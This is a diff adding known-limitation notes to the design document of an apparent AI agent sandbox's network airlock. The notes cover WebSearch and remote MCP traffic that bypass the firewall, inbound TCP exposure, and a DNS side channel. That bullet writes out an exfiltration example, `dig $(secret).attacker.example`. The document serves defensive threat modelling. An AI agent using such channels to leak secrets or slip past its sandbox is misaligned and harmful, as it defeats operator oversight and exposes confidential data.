@@ -179,6 +179,18 @@ Do not "fix" these without understanding why they are as they are:
   mount. Mitigated by keeping push on the host.
 - **`zshrc` is convention, not security.** Projects may replace it.
 - **Changing the allowlist requires a rebuild.** That cost is deliberate; see invariant 7.
+- **The airlock does not bound `WebSearch`, in any mode.** It runs server-side and its results
+  arrive over the `api.anthropic.com` channel, which is `required` in both modes, so iptables
+  never sees it. `Verified: CLOSED (Anthropic only)` is accurate about *egress* but does not
+  mean no external content reaches the agent. `net-guard.sh` is the only control, and it is a
+  tripwire. The same applies to any tool whose transport is that channel — remote MCP servers
+  in particular are currently unmatched.
+- **DNS is a side channel in both modes.** Queries go only to Docker's embedded resolver, which
+  forwards upstream, so `dig $(secret).attacker.example` leaves the container while closed.
+  Low bandwidth and egress-only; not fixable without breaking name resolution.
+- **Inbound TCP is accepted wholesale** so the host can reach published ports. Safe on a private
+  Docker network, but a port published on `0.0.0.0` rather than `127.0.0.1` lets the sandbox
+  serve content to the LAN.
 - **IPv6 is blocked wholesale, not allowlisted.** The allowlist is IPv4-only (ipset
   `hash:net`, A records), so v6 gets policy `DROP` plus loopback. Note `ccnet status`
   inspects only `iptables`, so it would not notice if the v6 rules were absent.
